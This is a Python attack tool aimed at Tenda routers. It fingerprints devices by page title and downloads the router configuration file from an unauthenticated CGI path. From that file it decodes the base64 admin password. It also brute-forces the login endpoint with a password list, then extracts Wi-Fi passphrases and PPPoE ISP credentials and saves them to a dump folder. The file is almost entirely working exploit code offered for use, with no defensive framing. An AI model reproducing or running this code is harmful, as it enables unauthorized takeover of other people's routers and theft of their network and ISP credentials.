import re
import os
import base64
import requests
import subprocess
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
colors = {
    'Color_Off': "\033[0m",
    'Black': "\033[0;30m",
    'Red': "\033[0;31m",
    'Green': "\033[0;32m",
    'Yellow': "\033[0;33m",
    'Blue': "\033[0;34m",
    'Purple': "\033[0;35m",
    'Cyan': "\033[0;36m",
    'White': "\033[0;37m"
}


def ip_checker(ip):
    if "/" in ip:
        splited = ip.split("/")
        if "http://" in ip or "https://" in ip:
            return f"{splited[0]}://{splited[2]}"
        else:
            return f"http://{splited[0]}"
    else:
        return f"http://{ip}"

def is_tenda(ip_port):
    try:
        response = requests.get(f'http://{ip_port}/', timeout=5)
        html = response.text
        m = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        if m:
            title = m.group(1).strip().lower()
            return 'tenda' in title
        return False
    except Exception as error:
        return False

def password_decoder(data):
    try:
        for nosense_data in data.split("\n"):
            if ("http_passwd=" in nosense_data):
                encoded_password = nosense_data.split("=", 1)[1]
                break
        password_bytes = base64.b64decode(encoded_password)
        password = password_bytes.decode("utf-8")
        if (len(password) != 0):
            return password
        return False
    except Exception as error:
        return False

def tenda_exploiter(ip):
    ip_address = ip_checker(ip)
    try:
        output = subprocess.check_output(f"curl {ip_address}/cgi-bin/DownloadCfg/RouterCfm.cfg -A '' -H 'Accept:' -H 'Host:' -s", shell=True, timeout=5)
        data = output.decode('utf-8')
        password = password_decoder(data)
        if password:
            if not os.path.isdir("config_dump"):
                os.mkdir("config_dump")
            with open(f"config_dump/{ip_address.split('/')[-1]}.cfg", "w") as o:
                o.write(data)
            print(f"{colors['Green']}[+]{colors['Yellow']} {ip_address}{colors['Color_Off']}", end="")
            print(f"{colors['Purple']}:{colors['Cyan']}{password}{colors['Color_Off']}")
            return password
        elif "Error" not in data:
            with open(f"config_dump/{ip_address.split('/')[-1]}.cfg", "w") as o:
                o.write(data)
            print(f"{colors['Green']}[+]{colors['Yellow']} {ip_address}{colors['Color_Off']}", end="")
            print(f"{colors['Purple']}:{colors['Green']}{'None'}{colors['Color_Off']}")
            return "None"
        else:
            print(f"{colors['Red']}[-]{colors['Yellow']} {ip_address}{colors['Color_Off']}")
            return None

    except Exception as error:
        print(error)
        return None
def tenda_brute(ip, passList):
    print(f"{colors['Blue']}[*]{colors['Color_Off']} Starting brute force attack on {colors['Blue']}Tenda router{colors['Color_Off']}")
    s = requests.Session()
    ip_address = ip_checker(ip)
    for count, passwd in enumerate(passList):
        encode = base64.b64encode(bytes(passwd, 'utf-8')).decode('ascii')
        payload = {
            'password': encode
        }
        try:
            retry = Retry(connect=5, backoff_factor=3)
            adapter = HTTPAdapter(max_retries=retry)
            s.mount('http://', adapter)
            login = s.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True, timeout=5)
            # time.sleep(0.5)
        except Exception as error:
            print(error)
            return False
        # TODO: Prevent program to stop after error
        if 'http://'+ip+'/index.html' == login.url:
            wifi = s.get('http://'+ip+'/goform/getWifi?modules=%2CwifiBasicCfg', timeout=5, stream=False)
            wan = s.get('http://'+ip+'/goform/getWAN?&modules=%2CwanBasicCfg', timeout=5, stream=False)
            credWifi = re.findall("\"wifi(?:SSID|Pwd)\":\"([^\"]*)\"", wifi.text)
            credWan = re.findall("\"wanPPPoE(?:User|Pwd)\":\"([^\"]*)\"", wan.text) 
            with open(f"config_dump/{ip_address.split('/')[-1]}.cfg", "w") as o:
                o.write(f"wl_ssid={credWifi[0]}\nwl_wpa_psk={credWifi[1]}\nwan0_pppoe_username={credWan[0]}\nwan0_pppoe_passwd={credWan[1]}\nhttp_passwd={encode}")
            print(f"{colors['Green']}[+] Password found! '{colors['Purple']}{passwd}{colors['Color_Off']}'")
            s.close()
            return passwd
        else:
            print(f"{colors['Red']}[-]{colors['Yellow']} Failed '{colors['Purple']}{passwd}{colors['Color_Off']}'")
            print(f"{colors['Blue']}[*] {colors['Yellow']}Progress: {colors['Blue']}{(count/len(passList))*100}% ({colors['Green']}{count}/{colors['Cyan']}{len(passList)}){colors['Color_Off']}")
    return None